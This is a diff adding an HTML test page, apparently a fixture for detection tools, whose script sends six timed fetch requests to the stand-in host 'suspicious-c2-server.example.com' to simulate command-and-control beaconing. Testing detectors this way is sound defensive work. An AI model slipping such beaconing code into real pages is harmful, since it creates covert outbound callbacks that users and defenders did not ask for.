@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Beaconing Test</title>
+</head>
+<body>
+    <h1>C2 Beaconing Detection Test</h1>
+    <p>This page makes periodic requests to simulate Command & Control beaconing behavior.</p>
+    <div id="status">Starting beaconing pattern...</div>
+    <ul id="beacon-log"></ul>
+
+    <script>
+        const c2Domain = 'suspicious-c2-server.example.com';
+        const log = document.getElementById('beacon-log');
+        const status = document.getElementById('status');
+
+        let beaconCount = 0;
+        const maxBeacons = 6; // Send 6 beacons for testing
+
+        // Simulate C2 beaconing with regular intervals
+        const beaconInterval = setInterval(() => {
+            if (beaconCount >= maxBeacons) {
+                clearInterval(beaconInterval);
+                status.textContent = `Beaconing complete. Sent ${beaconCount} beacons.`;
+                return;
+            }
+
+            const timestamp = new Date().toISOString();
+
+            // Send beacon request
+            fetch(`http://${c2Domain}/beacon?id=${beaconCount}&t=${timestamp}`, { mode: 'no-cors' })
+                .then(() => {
+                    const li = document.createElement('li');
+                    li.textContent = `Beacon ${beaconCount + 1} sent at ${timestamp}`;
+                    log.appendChild(li);
+                })
+                .catch((error) => {
+                    const li = document.createElement('li');
+                    li.textContent = `Beacon ${beaconCount + 1} failed: ${error.message}`;
+                    log.appendChild(li);
+                });
+
+            beaconCount++;
+            status.textContent = `Beaconing in progress... (${beaconCount}/${maxBeacons})`;
+        }, 5000); // Beacon every 5 seconds - regular pattern characteristic of C2
+    </script>
+</body>
+</html>
